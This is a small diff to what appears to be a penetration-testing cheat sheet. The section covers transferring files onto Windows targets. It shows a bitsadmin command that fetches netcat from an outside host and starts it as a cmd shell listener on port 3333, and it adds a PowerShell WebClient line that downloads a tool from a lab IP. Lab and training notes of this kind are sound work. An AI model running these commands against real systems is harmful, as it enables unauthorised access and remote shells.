@@ -184,6 +184,8 @@ cat fileWithBase64Content | base64 -d > finalBinary
 
 bitsadmin /transfer evil.exe /download /priority high https://wslab.de/tools/nc.exe %temp%\evil.exe & start /wait %temp%\evil.exe -l -p 3333 -e cmd & del %temp%\evil.exe
 
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Deskto p\wget.exe')"
+
 ```
 
 ENCODING/DECODING
